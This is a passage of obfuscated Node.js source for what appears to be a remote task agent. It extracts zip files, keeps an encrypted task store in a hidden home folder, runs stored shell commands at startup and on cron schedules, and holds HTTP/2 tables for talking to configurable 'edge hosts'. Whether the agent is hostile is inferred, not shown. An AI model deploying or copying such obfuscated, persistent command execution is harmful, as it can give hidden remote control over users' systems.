                                    if (w[cy(0xd7)]()) {
                                        if (!g[cy(0x503)](v + '/', Buffer['alloc'](0x0), w[cy(0x1f7)], !![])) {
                                            o = !![];
                                            return;
                                        }
                                        d[cy(0x5f5)](q, u, v);
                                        if (o)
                                            return;
                                    } else {
                                        if (w[cy(0x6c7)]()) {
                                            if (!g[cy(0x503)](v, a0l['readFileSync'](u), w[cy(0x1f7)])) {
                                                o = !![];
                                                return;
                                            }
                                            n++;
                                        }
                                    }
                                }
                            };
                        d[cx(0x5f5)](q, l, c ? '' : p);
                    } else {
                        h['push']({
                            'item': k,
                            'status': d[cx(0x50b)],
                            'added': 0x0
                        });
                        continue;
                    }
                }
                if (o) {
                    j = !![], i += n, h[cx(0x560)]({
                        'item': k,
                        'status': 'partial',
                        'added': n
                    });
                    continue;
                }
                i += n, h['push']({
                    'item': k,
                    'status': 'ok',
                    'added': n
                });
            } catch (r) {
                h[cx(0x560)]({
                    'item': k,
                    'status': d[cx(0x50b)],
                    'added': 0x0
                });
            }
        }
        return g[cx(0x233)](), {
            'status': 'ok',
            'path': a0Y[cx(0x2b1)](f),
            'entries': i,
            'size': a0l['existsSync'](f) ? a0l[cx(0x52c)](f)[cx(0x540)] : 0x0,
            'results': h
        };
    }
    static async [a0aY(0x661)](a, b, c = !![], d = null) {
        const cz = a0aY, f = {
                'dVuYK': cz(0x7de),
                'nAkDj': function (p, q) {
                    return p(q);
                },
                'ZyLFb': 'Access\x20denied:\x20path\x20outside\x20root',
                'IYsBF': function (p, q) {
                    return p(q);
                },
                'oHdnU': function (p, q) {
                    return p >= q;
                },
                'LUWMw': function (p, q) {
                    return p + q;
                },
                'mgDxw': function (p, q) {
                    return p >= q;
                },
                'kXLOQ': function (p, q) {
                    return p + q;
                },
                'CuHTr': function (p, q) {
                    return p < q;
                }
            };
        if (!a)
            throw new Error(f[cz(0x84a)]);
        const g = a0o[cz(0x2c6)](a0P['FILE_ROOT'], a);
        if (!f['nAkDj'](a0W, g))
            throw new Error(f['ZyLFb']);
        if (!a0l[cz(0x291)](g))
            throw new Error(cz(0x445) + a);
        if (a0l[cz(0x52c)](g)[cz(0xd7)]())
            throw new Error(cz(0x254) + a);
        let h;
        if (b) {
            h = a0o['resolve'](a0P[cz(0x394)], b);
            if (!f[cz(0x4ab)](a0W, h))
                throw new Error(f[cz(0x789)]);
            if (a0l[cz(0x291)](h) && !a0l[cz(0x52c)](h)[cz(0xd7)]())
                throw new Error(cz(0x49f) + b);
        } else
            h = a0o['dirname'](g);
        a0l[cz(0x340)](h, { 'recursive': !![] });
        let i;
        try {
            i = a0X[cz(0x517)](g);
        } catch (p) {
            throw new Error(cz(0x25b) + a);
        }
        const j = (d || [])[cz(0xfb)](q => q);
        let k = 0x0, l = 0x0, m = 0x0;
        const n = [];
        let o = ![];
        for (const q of i) {
            if (q[cz(0x66b)])
                continue;
            if (f[cz(0x1f6)](f['LUWMw'](k, l), a0X[cz(0x3ae)]) || f[cz(0x1ab)](m, a0X[cz(0x33b)])) {
                l++;
                continue;
            }
            const r = q[cz(0x467)][cz(0xed)](/\\/g, '/');
            if (j[cz(0x7bc)]) {
                const v = r[cz(0x493)]('/')[cz(0x3ea)]();
                if (!j[cz(0x7a2)](r) && !j['includes'](v)) {
                    l++;
                    continue;
                }
            }
            if (q['encrypted'] || q[cz(0x44d)] || f['kXLOQ'](m, q[cz(0x540)]) > a0X['ZIP_MAX_TOTAL_BYTES']) {
                l++;
                continue;
            }
            const s = a0o[cz(0x2c6)](h, r), t = a0o[cz(0x5a5)](h, s);
            if (t[cz(0x315)]('..') || a0o[cz(0x13c)](t)) {
                l++;
                continue;
            }
            if (!a0W(s)) {
                l++;
                continue;
            }
            let u;
            try {
                u = a0X[cz(0x634)](q);
            } catch (w) {
                l++;
                continue;
            }
            if (a0X[cz(0x424)](u) !== q['crc']) {
                l++;
                continue;
            }
            if (!c && a0l[cz(0x291)](s)) {
                l++;
                continue;
            }
            try {
                a0l[cz(0x340)](a0o[cz(0x2d4)](s), { 'recursive': !![] }), a0l[cz(0x67a)](s, u);
            } catch (x) {
                l++;
                continue;
            }
            k++, m += q[cz(0x540)], f['CuHTr'](n['length'], a0X['ZIP_MAX_LISTED_FILES']) ? n[cz(0x560)](a0Y['_displayPath'](s)) : o = !![];
        }
        return {
            'status': 'ok',
            'path': a0Y[cz(0x2b1)](g),
            'dest': a0Y['_displayPath'](h),
            'extracted': k,
            'skipped': l,
            'files': n,
            'files_truncated': o
        };
    }
}
class a0Z {
    static [a0aY(0x448)] = a0aY(0x400);
    static [a0aY(0x5d9)] = 0x1;
    static [a0aY(0x80f)] = {
        'enabled': ![],
        'locked': ![],
        'path': null,
        'key': null,
        'lastSavedAt': null
    };
    static ['homeDir']() {
        const cA = a0aY;
        for (const a of [
                process.env.USERPROFILE,
                process.env.HOME
            ]) {
            if (a && a0l[cA(0x291)](a))
                return a;
        }
        try {
            return a0p[cA(0x7cc)]() || process['cwd']();
        } catch (b) {
            return process[cA(0x5ff)]();
        }
    }
    static [a0aY(0x380)](a) {
        const cB = a0aY, b = {
                'RGpuz': 'hex',
                'fzsJY': function (c, d) {
                    return c === d;
                },
                'OBPXy': cB(0x2df),
                'nzlSZ': function (c, d) {
                    return c === d;
                }
            };
        if (!a)
            return null;
        try {
            if (/^[0-9a-fA-F]{64}$/['test'](a)) {
                const d = Buffer[cB(0x664)](a, b['RGpuz']);
                return b[cB(0x7a7)](d['length'], 0x20) ? d : null;
            }
            if (!/^[A-Za-z0-9+/]+={0,2}$/[cB(0x75b)](a))
                return null;
            const c = Buffer[cB(0x664)](a, b[cB(0xaa)]);
            return b['nzlSZ'](c[cB(0x7bc)], 0x20) ? c : null;
        } catch (f) {
            return null;
        }
    }
    static ['init']() {
        const cC = a0aY, a = {
                'wMvJi': cC(0x677),
                'FUDbS': '[TaskStore]\x20💾\x20KSTORE=off,\x20任务持久化已显式关闭',
                'msDxN': 'store.enc',
                'sIKCS': cC(0x797),
                'YvFDH': '[TaskStore]\x20💾\x20KSTORE_KEY\x20未设置,\x20任务持久化未启用'
            }, b = a0Z[cC(0x80f)];
        let c = (process.env.KSTORE || '')['trim']();
        if ([
                'off',
                '0',
                a[cC(0x1fd)],
                cC(0x2ea)
            ][cC(0x7a2)](c['toLowerCase']()))
            return a0D[cC(0x554)](a[cC(0x35a)]), b;
        const d = (process.env.KSTORE_KEY || '')[cC(0x450)]();
        !c && (c = a0o[cC(0x16d)](a0Z[cC(0x670)](), '.tmp', a['msDxN']));
        const f = a0Z[cC(0x380)](d);
        if (!f) {
            if (d)
                a0D['error'](a[cC(0x7b7)]);
            else
                a0D[cC(0x554)](a[cC(0x72f)]);
            return b;
        }
        return b[cC(0x7d7)] = c, b[cC(0x34d)] = f, b[cC(0x45d)] = !![], a0D[cC(0x554)](cC(0x19d) + b[cC(0x7d7)]), b;
    }
    static [a0aY(0x5a8)](a, b) {
        const cD = a0aY, c = {
                'HIbRy': cD(0x69e),
                'TUqze': 'utf8',
                'PzbnG': 'base64'
            }, d = a0k[cD(0x1ee)](0xc), f = a0k['createCipheriv'](c[cD(0x718)], a, d), g = Buffer[cD(0x12a)]([
                f[cD(0x199)](Buffer[cD(0x664)](b, c['TUqze'])),
                f[cD(0x550)]()
            ]), h = {
                'nonce': d[cD(0xec)](cD(0x2df)),
                'tag': f['getAuthTag']()[cD(0xec)](c[cD(0x555)]),
                'ciphertext': g[cD(0xec)](c[cD(0x555)])
            };
        return Buffer['from'](JSON[cD(0x823)](h), c[cD(0x3f5)])[cD(0xec)](c[cD(0x555)]);
    }
    static ['decrypt'](a, b) {
        const cE = a0aY, c = {
                'eVAPL': cE(0x69e),
                'JnulR': 'base64',
                'SVgCD': cE(0x31e)
            }, d = JSON[cE(0x517)](Buffer[cE(0x664)](b, cE(0x2df))['toString'](cE(0x31e)));
        if (!d[cE(0x68d)] || !d['tag'] || !d[cE(0x23a)])
            throw new Error(cE(0x359));
        const f = a0k[cE(0x292)](c[cE(0x5d5)], a, Buffer[cE(0x664)](d[cE(0x68d)], 'base64'));
        return f[cE(0x3e8)](Buffer[cE(0x664)](d[cE(0x4a9)], c[cE(0x2f6)])), Buffer[cE(0x12a)]([
            f[cE(0x199)](Buffer[cE(0x664)](d[cE(0x23a)], cE(0x2df))),
            f[cE(0x550)]()
        ])[cE(0xec)](c['SVgCD']);
    }
    static [a0aY(0x3f3)]() {
        const cF = a0aY, a = {
                'VStpc': cF(0x31e),
                'WmjlU': function (c, d) {
                    return c !== d;
                },
                'PWpJB': function (c, d, f) {
                    return c(d, f);
                },
                'foAJj': function (c, d) {
                    return c > d;
                },
                'HavAR': function (c, d) {
                    return c(d);
                }
            }, b = a0Z[cF(0x80f)];
        if (!b['enabled'])
            return {
                'onetasks': [],
                'crontasks': {}
            };
        try {
            if (!a0l[cF(0x291)](b[cF(0x7d7)]))
                return {
                    'onetasks': [],
                    'crontasks': {}
                };
            const c = a0l[cF(0x23e)](b[cF(0x7d7)], a[cF(0x75a)])[cF(0x450)]();
            if (!c)
                return {
                    'onetasks': [],
                    'crontasks': {}
                };
            let d;
            try {
                d = JSON['parse'](a0Z[cF(0x6f0)](b[cF(0x34d)], c));
            } catch (j) {
                throw new Error(cF(0x788) + j[cF(0x5a9)]);
            }
            if (!d || a[cF(0x5da)](d[cF(0x2d5)], a0Z[cF(0x448)]))
                throw new Error(cF(0x463));
            const f = a[cF(0x29d)](parseInt, d[cF(0x514)], 0xa) || 0x0;
            if (a[cF(0x1d0)](f, a0Z['VERSION']))
                return b['locked'] = !![], a0D['error'](cF(0x6bf) + f + cF(0x53d) + a0Z['VERSION'] + ',\x20保留原文件不覆盖,\x20本次以空任务启动且持久化只读'), {
                    'onetasks': [],
                    'crontasks': {}
                };
            if (a[cF(0x5da)](f, a0Z['VERSION']))
                throw new Error(cF(0x290) + f);
            const g = d['data'] || {};
            b['lastSavedAt'] = d[cF(0x77f)] || null;
            const h = Array[cF(0x1a7)](g['onetasks']) ? g[cF(0x363)][cF(0x415)](String) : [], i = {};
            for (const [l, m] of Object[cF(0x2b2)](g[cF(0x4be)] || {}))
                i[a[cF(0x285)](String, l)] = a[cF(0x285)](String, m);
            return a0D['info']('[TaskStore]\x20💾\x20已恢复持久化任务:\x20onetime=' + h['length'] + cF(0x268) + Object['keys'](i)[cF(0x7bc)]), {
                'onetasks': h,
                'crontasks': i
            };
        } catch (n) {
            return a0Z[cF(0x432)](cF(0x71e) + n[cF(0x5a9)]), {
                'onetasks': [],
                'crontasks': {}
            };
        }
    }
    static [a0aY(0x432)](a) {
        const cG = a0aY;
        try {
            const b = a0Z[cG(0x80f)];
            if (b['path'] && a0l[cG(0x291)](b[cG(0x7d7)])) {
                const c = b[cG(0x7d7)] + cG(0x410) + Date['now']();
                a0l[cG(0x83c)](b[cG(0x7d7)], c), a0D[cG(0x1c6)](cG(0x7c5) + a + cG(0x7e5) + c);
            } else
                a0D[cG(0x1c6)]('[TaskStore]\x20❌\x20' + a);
        } catch (d) {
            a0D['error'](cG(0x7c5) + a + cG(0x3a7) + d[cG(0x5a9)]);
        }
    }
    static [a0aY(0x201)](a, b) {
        const cH = a0aY, c = a0Z[cH(0x80f)];
        if (!c[cH(0x45d)] || c[cH(0x34b)])
            return ![];
        let d = null;
        try {
            const f = {
                    'magic': a0Z['MAGIC'],
                    'version': a0Z['VERSION'],
                    'saved_at': new Date()[cH(0x2e6)]()[cH(0xed)](/\.\d+Z$/, 'Z'),
                    'data': {
                        'onetasks': a || [],
                        'crontasks': b || {}
                    }
                }, g = a0Z[cH(0x5a8)](c[cH(0x34d)], JSON[cH(0x823)](f));
            return a0l[cH(0x340)](a0o[cH(0x2d4)](c[cH(0x7d7)]), { 'recursive': !![] }), d = c['path'] + cH(0x746) + process[cH(0x76c)], a0l[cH(0x67a)](d, g, cH(0x31e)), a0l[cH(0x83c)](d, c[cH(0x7d7)]), c[cH(0xe1)] = f['saved_at'], !![];
        } catch (h) {
            a0D[cH(0x1c6)](cH(0x6f3) + h[cH(0x5a9)]);
            try {
                if (d && a0l['existsSync'](d))
                    a0l[cH(0x7db)](d);
            } catch (i) {
            }
            return ![];
        }
    }
}
class a0a0 {
    static ['cronJobs'] = new Map();
    static [a0aY(0x610)](a, b) {
        const cI = a0aY, c = {
                'PLHRV': function (d, f) {
                    return d - f;
                }
            };
        a[cI(0x560)](b), a[cI(0x7bc)] > a0P['MAX_TASK_LOG_SIZE'] && a[cI(0x6aa)](0x0, c[cI(0x3fa)](a[cI(0x7bc)], a0P[cI(0x19c)]));
    }
    static ['_formatLogEntry'](a, b, c, d, f = null) {
        const cJ = a0aY, g = new Date()['toISOString']();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': g + cJ(0xab) + a + '\x20----\x20exitcode=' + c + '\x0a' + (b?.['trim']() || '')
        };
    }
    static ['getOnetimeTasks']() {
        const cK = a0aY;
        return {
            'status': 'ok',
            'count': a0P[cK(0x363)][cK(0x7bc)],
            'tasks': a0P['onetasks']
        };
    }
    static async [a0aY(0x9f)](a) {
        const cL = a0aY, b = {
                'RqlFi': function (d, f) {
                    return d > f;
                },
                'tNETW': function (d, f) {
                    return d < f;
                },
                'hhALz': 'onetime',
                'YVdvf': function (d, f) {
                    return d === f;
                },
                'jGBZz': cL(0x1c6)
            };
        a0P['onetasks'] = a || [];
        const c = [];
        if (a0P[cL(0x2c7)] && b[cL(0x4a5)](a0P[cL(0x363)][cL(0x7bc)], 0x0)) {
            for (let d = 0x0; b['tNETW'](d, a0P['onetasks'][cL(0x7bc)]); d++) {
                const f = a0P['onetasks'][d], g = await a0V['execute'](f), h = this[cL(0x4ba)](f, g[cL(0x835)], g[cL(0x2a0)], b['hhALz']);
                this[cL(0x610)](a0P[cL(0x414)], h), c[cL(0x560)]({
                    'index': d,
                    'cmd': f,
                    'exitcode': g[cL(0x2a0)],
                    'output': g[cL(0x835)],
                    'status': b[cL(0x3cb)](g['exitcode'], 0x0) ? 'ok' : b[cL(0x203)]
                });
            }
            a0P['InitTask'] = ![];
        }
        return {
            'status': 'ok',
            'count': a0P[cL(0x363)][cL(0x7bc)],
            'tasks': a0P['onetasks'],
            'executed': c,
            'persisted': a0Z[cL(0x201)](a0P[cL(0x363)], a0P['crontasks'])
        };
    }
    static [a0aY(0x391)]() {
        const cM = a0aY;
        return {
            'status': 'ok',
            'count': Object[cM(0x80a)](a0P[cM(0x4be)])[cM(0x7bc)],
            'tasks': a0P[cM(0x4be)]
        };
    }
    static [a0aY(0xa7)](a) {
        const cN = a0aY, b = {
                'puYdB': function (d, f) {
                    return d === f;
                },
                'IQYcI': cN(0xca),
                'rqzup': 'cron',
                'oaiFX': cN(0x1c6),
                'Ywqdz': function (d, f) {
                    return d - f;
                },
                'AvRXB': function (d, f) {
                    return d > f;
                }
            };
        this[cN(0x787)][cN(0x148)](d => {
            const cO = cN;
            b['puYdB'](typeof d[cO(0x48e)], b[cO(0xb0)]) && d[cO(0x48e)](), typeof d[cO(0x541)] === b['IQYcI'] && d[cO(0x541)]();
        }), this[cN(0x787)]['clear']();
        const c = [];
        for (const d of Object[cN(0x80a)](a || {})) {
            !a0t[cN(0x7a1)](d) && c[cN(0x560)](d);
        }
        if (c[cN(0x7bc)] > 0x0)
            return {
                'status': b['oaiFX'],
                'message': cN(0x7eb) + c[cN(0x16d)](',\x20'),
                'valid_count': b['Ywqdz'](Object[cN(0x80a)](a || {})[cN(0x7bc)], c[cN(0x7bc)])
            };
        a0P[cN(0x4be)] = a || {};
        for (const [f, g] of Object[cN(0x2b2)](a0P[cN(0x4be)])) {
            const h = a0t['schedule'](f, async () => {
                const cP = cN, i = await a0V[cP(0x698)](g), j = this['_formatLogEntry'](g, i['result'], i[cP(0x2a0)], b[cP(0x57c)], f);
                this['_appendLog'](a0P[cP(0x36a)], j);
            });
            this[cN(0x787)]['set'](f, h);
        }
        return a0P[cN(0x3a5)] = b['AvRXB'](Object[cN(0x80a)](a0P['crontasks'])[cN(0x7bc)], 0x0), {
            'status': 'ok',
            'count': Object[cN(0x80a)](a0P[cN(0x4be)])['length'],
            'tasks': a0P[cN(0x4be)],
            'persisted': a0Z[cN(0x201)](a0P[cN(0x363)], a0P[cN(0x4be)])
        };
    }
    static [a0aY(0x367)]() {
        const cQ = a0aY;
        return {
            'onetime': {
                'pending': a0P[cQ(0x2c7)],
                'count': a0P[cQ(0x363)][cQ(0x7bc)]
            },
            'cron': {
                'active': a0P[cQ(0x3a5)],
                'count': Object[cQ(0x80a)](a0P['crontasks'])[cQ(0x7bc)],
                'check_interval': a0P[cQ(0x144)]
            },
            'persistence': {
                'enabled': a0Z[cQ(0x80f)][cQ(0x45d)],
                'store_path': a0Z[cQ(0x80f)][cQ(0x7d7)],
                'last_saved_at': a0Z[cQ(0x80f)][cQ(0xe1)]
            }
        };
    }
    static ['getOnetimeLogs'](a = 0x32) {
        const cR = a0aY, b = a0P[cR(0x414)][cR(0x462)](-a);
        return {
            'status': 'ok',
            'count': b[cR(0x7bc)],
            'logs': b
        };
    }
    static [a0aY(0x497)](a = 0x32) {
        const cS = a0aY, b = a0P[cS(0x36a)][cS(0x462)](-a);
        return {
            'status': 'ok',
            'count': b[cS(0x7bc)],
            'logs': b
        };
    }
    static ['clearOnetimeLogs']() {
        const cT = a0aY, a = { 'WjiUr': cT(0x3e2) }, b = a0P['onetimetasks_log'][cT(0x7bc)];
        return a0P['onetimetasks_log'] = [], {
            'status': 'ok',
            'cleared': a[cT(0x5bb)]
        };
    }
    static ['clearCronLogs']() {
        const cU = a0aY, a = { 'txVbm': 'cron' }, b = a0P[cU(0x36a)][cU(0x7bc)];
        return a0P['crontasks_log'] = [], {
            'status': 'ok',
            'cleared': a['txVbm']
        };
    }
    static [a0aY(0xfc)]() {
        const cV = a0aY, a = {
                'AfqvX': function (g, h) {
                    return g - h;
                }
            }, b = a0P[cV(0x414)][cV(0xfb)](g => g[cV(0x2a0)] === 0x0)['length'], c = a[cV(0x3b1)](a0P[cV(0x414)][cV(0x7bc)], b), d = a0P[cV(0x36a)]['filter'](g => g[cV(0x2a0)] === 0x0)[cV(0x7bc)], f = a0P['crontasks_log'][cV(0x7bc)] - d;
        return {
            'onetime': {
                'total_logged': a0P['onetimetasks_log'][cV(0x7bc)],
                'max_capacity': a0P[cV(0x19c)],
                'recent_success': b,
                'recent_failed': c
            },
            'cron': {
                'total_logged': a0P[cV(0x36a)]['length'],
                'max_capacity': a0P[cV(0x19c)],
                'recent_success': d,
                'recent_failed': f
            }
        };
    }
    static async ['executeOnetimeTasks']() {
        const cW = a0aY, a = {
                'iSpes': function (c, d) {
                    return c < d;
                },
                'tNCNC': cW(0x3e2)
            }, b = [];
        for (let c = 0x0; a['iSpes'](c, a0P[cW(0x363)]['length']); c++) {
            const d = a0P[cW(0x363)][c], f = await a0V[cW(0x698)](d), g = this['_formatLogEntry'](d, f[cW(0x835)], f[cW(0x2a0)], a[cW(0x4af)]);
            this[cW(0x610)](a0P['onetimetasks_log'], g), b[cW(0x560)]({
                'cmd': d,
                'exitcode': f[cW(0x2a0)],
                'output': f[cW(0x835)],
                'timeout': f[cW(0x3e9)]
            });
        }
        return a0P[cW(0x2c7)] = ![], {
            'status': 'ok',
            'executed': b[cW(0x7bc)],
            'results': b
        };
    }
    static [a0aY(0x598)]() {
        const cX = a0aY, a = {
                'jhFhl': function (c, d) {
                    return c > d;
                }
            };
        a0Z[cX(0x30b)]();
        const b = a0Z[cX(0x3f3)]();
        a[cX(0x827)](b[cX(0x363)][cX(0x7bc)], 0x0) && (a0P['onetasks'] = b[cX(0x363)]);
        if (Object[cX(0x80a)](b[cX(0x4be)])[cX(0x7bc)] > 0x0)
            try {
                a0a0['setCronTasks'](b[cX(0x4be)]);
            } catch (c) {
                a0D[cX(0x1c6)](cX(0x5cf) + c[cX(0x5a9)]);
            }
        a0P[cX(0x363)][cX(0x7bc)] > 0x0 && a0P[cX(0x2c7)] && a0a0[cX(0x65f)]()[cX(0x521)](d => a0D[cX(0x1c6)]('[TaskStore]\x20❌\x20启动任务恢复执行异常\x20(不影响服务):\x20' + d[cX(0x5a9)]));
    }
}
const a0a1 = a0aY(0x4a0), a0a2 = ((() => {
        const cY = a0aY, a = {
                'HpQVy': function (c, d) {
                    return c(d);
                },
                'tTHed': cY(0x6ad),
                'kSjxM': cY(0x269)
            }, b = a['HpQVy'](String, process.env.KISAMA_EDGE_HOSTS || '')[cY(0x493)](',')[cY(0x415)](c => c['trim']())[cY(0xfb)](Boolean);
        return b[cY(0x7bc)] > 0x0 ? b : [
            a['tTHed'],
            a[cY(0x1b4)]
        ];
    })()), a0a3 = 0x1ea4, a0a4 = a0aY(0xeb), a0a5 = a0aY(0x6e0), a0a6 = 0x4000, a0a7 = [
        [
            ':authority',
            ''
        ],
        [
            a0aY(0x613),
            'GET'
        ],
        [
            a0aY(0x613),
            'POST'
        ],
        [
            a0aY(0x7d9),
            '/'
        ],
        [
            a0aY(0x7d9),
            '/index.html'
        ],
        [
            a0aY(0x570),
            a0aY(0x474)
        ],
        [
            ':scheme',
            'https'
        ],
        [
            a0aY(0xf6),
            a0aY(0x3cf)
        ],
        [
            a0aY(0xf6),
            a0aY(0x31f)
        ],
        [
            a0aY(0xf6),
            a0aY(0x6e3)
        ],
        [
            a0aY(0xf6),
            a0aY(0x6c6)
        ],
        [
            a0aY(0xf6),
            '400'
        ],
        [
            a0aY(0xf6),
            a0aY(0x66c)
        ],
        [
            a0aY(0xf6),
            a0aY(0x52e)
        ],
        [
            a0aY(0x422),
            ''
        ],
        [
            'accept-encoding',
            a0aY(0x518)
        ],
        [
            a0aY(0x176),
            ''
        ],
        [
            a0aY(0x382),
            ''
        ],
        [
            a0aY(0x20d),
            ''
        ],
        [
            'access-control-allow-origin',
            ''
        ],
        [
            a0aY(0x62e),
            ''
        ],
        [
            a0aY(0x1fa),
            ''
        ],
        [
            a0aY(0x792),
            ''
        ],
        [
            a0aY(0x71a),
            ''
        ],
        [
            a0aY(0x427),
            ''
        ],
        [
            a0aY(0x40d),
            ''
        ],
        [
            a0aY(0x515),
            ''
        ],
        [
            a0aY(0x557),
            ''
        ],
        [
            'content-location',
            ''
        ],
        [
            a0aY(0x24c),
            ''
        ],
        [
            a0aY(0x5c0),
            ''
        ],
        [
            'cookie',
            ''
        ],
        [
            a0aY(0x4fc),
            ''
        ],
        [
            a0aY(0x1fb),
            ''
        ],
        [
            a0aY(0x181),
            ''
        ],
        [
            'expires',
            ''
        ],
        [
            'from',
            ''
        ],
        [
            a0aY(0x57f),
            ''
        ],
        [
            a0aY(0x456),
            ''
        ],
        [
            a0aY(0x4ca),
            ''
        ],
        [
            a0aY(0x776),
            ''
        ],
        [
            'if-range',
            ''
        ],
        [
            'if-unmodified-since',
            ''
        ],
        [
            'last-modified',
            ''
        ],
        [
            a0aY(0x6df),
            ''
        ],
        [
            a0aY(0x385),
            ''
        ],
        [
            a0aY(0x143),
            ''
        ],
        [
            a0aY(0x822),
            ''
        ],
        [
            'proxy-authorization',
            ''
        ],
        [
            'range',
            ''
        ],
        [
            a0aY(0x11a),
            ''
        ],
        [
            a0aY(0x52a),
            ''
        ],
        [
            a0aY(0x407),
            ''
        ],
        [
            'server',
            ''
        ],
        [
            a0aY(0x38c),
            ''
        ],
        [
            a0aY(0x6b2),
            ''
        ],
        [
            a0aY(0x645),
            ''
        ],
        [
            a0aY(0x341),
            ''
        ],
        [
            a0aY(0x43f),
            ''
        ],
        [
            'via',
            ''
        ],
        [
            'www-authenticate',
            ''
        ]
    ], a0a8 = [
        0x1ff8,
        0x7fffd8,
        0xfffffe2,
        0xfffffe3,
        0xfffffe4,
        0xfffffe5,
        0xfffffe6,
        0xfffffe7,
        0xfffffe8,
        0xffffea,
        0x3ffffffc,
        0xfffffe9,
        0xfffffea,
        0x3ffffffd,
        0xfffffeb,
        0xfffffec,
        0xfffffed,
        0xfffffee,
        0xfffffef,
        0xffffff0,
        0xffffff1,
        0xffffff2,
        0x3ffffffe,
        0xffffff3,
        0xffffff4,
        0xffffff5,
        0xffffff6,
        0xffffff7,
        0xffffff8,
        0xffffff9,
        0xffffffa,
        0xffffffb,
        0x14,
        0x3f8,
        0x3f9,
        0xffa,
        0x1ff9,
        0x15,
        0xf8,
        0x7fa,
        0x3fa,
        0x3fb,
        0xf9,
        0x7fb,
        0xfa,
        0x16,
        0x17,
        0x18,
        0x0,
        0x1,
        0x2,
        0x19,
        0x1a,
        0x1b,
        0x1c,
        0x1d,
        0x1e,
        0x1f,
        0x5c,
        0xfb,
        0x7ffc,
        0x20,
        0xffb,
        0x3fc,
        0x1ffa,
        0x21,
        0x5d,
        0x5e,
        0x5f,
        0x60,
        0x61,
        0x62,
        0x63,
        0x64,
        0x65,
        0x66,
        0x67,
        0x68,
        0x69,
        0x6a,
        0x6b,
        0x6c,
        0x6d,
        0x6e,
        0x6f,
        0x70,
        0x71,
        0x72,
        0xfc,
        0x73,
        0xfd,
        0x1ffb,
        0x7fff0,
        0x1ffc,
        0x3ffc,
        0x22,
        0x7ffd,
        0x3,
        0x23,
        0x4,
        0x24,
        0x5,
        0x25,
        0x26,
        0x27,
        0x6,
        0x74,
        0x75,
        0x28,
        0x29,
        0x2a,
        0x7,
        0x2b,
        0x76,
        0x2c,
        0x8,
        0x9,
        0x2d,
        0x77,
        0x78,
        0x79,
        0x7a,
        0x7b,
        0x7ffe,
        0x7fc,
        0x3ffd,
        0x1ffd,
        0xffffffc,
        0xfffe6,
        0x3fffd2,
        0xfffe7,
        0xfffe8,
        0x3fffd3,
        0x3fffd4,
        0x3fffd5,
        0x7fffd9,
        0x3fffd6,
        0x7fffda,
        0x7fffdb,
        0x7fffdc,
        0x7fffdd,
        0x7fffde,
        0xffffeb,
        0x7fffdf,
        0xffffec,
        0xffffed,
        0x3fffd7,
        0x7fffe0,
        0xffffee,
        0x7fffe1,
        0x7fffe2,
        0x7fffe3,
        0x7fffe4,
        0x1fffdc,
        0x3fffd8,
        0x7fffe5,
        0x3fffd9,
        0x7fffe6,
        0x7fffe7,
        0xffffef,
        0x3fffda,
        0x1fffdd,
        0xfffe9,
        0x3fffdb,
        0x3fffdc,
        0x7fffe8,
        0x7fffe9,
        0x1fffde,
        0x7fffea,
        0x3fffdd,
        0x3fffde,
        0xfffff0,
        0x1fffdf,
        0x3fffdf,
        0x7fffeb,
        0x7fffec,
        0x1fffe0,
        0x1fffe1,
        0x3fffe0,
        0x1fffe2,
        0x7fffed,
        0x3fffe1,
        0x7fffee,
        0x7fffef,
        0xfffea,
        0x3fffe2,
        0x3fffe3,
        0x3fffe4,
        0x7ffff0,
        0x3fffe5,
        0x3fffe6,
        0x7ffff1,
        0x3ffffe0,
        0x3ffffe1,
        0xfffeb,
        0x7fff1,
        0x3fffe7,
        0x7ffff2,
        0x3fffe8,
        0x1ffffec,
        0x3ffffe2,
        0x3ffffe3,
        0x3ffffe4,
        0x7ffffde,
        0x7ffffdf,
        0x3ffffe5,
        0xfffff1,
        0x1ffffed,
        0x7fff2,
        0x1fffe3,
        0x3ffffe6,
        0x7ffffe0,
        0x7ffffe1,
        0x3ffffe7,
        0x7ffffe2,
        0xfffff2,
        0x1fffe4,
        0x1fffe5,
        0x3ffffe8,
        0x3ffffe9,
        0xffffffd,
        0x7ffffe3,
        0x7ffffe4,
        0x7ffffe5,
        0xfffec,
        0xfffff3,
        0xfffed,
        0x1fffe6,
        0x3fffe9,
        0x1fffe7,
        0x1fffe8,
        0x7ffff3,
        0x3fffea,
        0x3fffeb,
        0x1ffffee,
        0x1ffffef,
        0xfffff4,
        0xfffff5,
        0x3ffffea,
        0x7ffff4,
        0x3ffffeb,
        0x7ffffe6,
        0x3ffffec,
        0x3ffffed,
        0x7ffffe7,
        0x7ffffe8,
        0x7ffffe9,
        0x7ffffea,
        0x7ffffeb,
        0xffffffe,
        0x7ffffec,
        0x7ffffed,
        0x7ffffee,
        0x7ffffef,
        0x7fffff0,
        0x3ffffee,
        0x3fffffff
    ], a0a9 = [
        0xd,
        0x17,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x18,
        0x1e,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x6,
        0xa,
        0xa,
        0xc,
        0xd,
        0x6,
        0x8,
        0xb,
        0xa,
        0xa,
        0x8,
        0xb,
        0x8,
        0x6,
        0x6,
        0x6,
        0x5,
        0x5,
        0x5,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x7,
        0x8,
        0xf,
        0x6,
        0xc,
        0xa,
        0xd,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x8,
        0x7,
        0x8,
        0xd,
        0x13,
        0xd,
        0xe,
        0x6,
        0xf,
        0x5,
        0x6,
        0x5,
        0x6,
        0x5,
        0x6,
        0x6,
        0x6,
        0x5,
        0x7,
        0x7,
        0x6,
        0x6,
        0x6,
        0x5,
        0x6,
        0x7,
        0x6,
        0x5,
        0x5,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0xf,
        0xb,
        0xe,
        0xd,
        0x1c,
        0x14,
        0x16,
        0x14,
        0x14,
        0x16,
        0x16,
        0x16,
